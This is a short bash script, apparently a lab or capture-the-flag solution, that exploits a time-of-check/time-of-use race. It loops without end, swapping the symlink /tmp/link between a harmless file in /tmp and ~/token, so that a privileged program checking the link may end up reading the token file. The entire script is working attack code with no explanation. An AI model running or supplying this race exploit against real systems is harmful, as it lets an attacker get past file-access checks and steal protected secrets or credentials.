#!/bin/bash
touch /tmp/fakefile
while true; do
        ln -sf /tmp/fakefile /tmp/link
        ln -sf ~/token /tmp/link
done
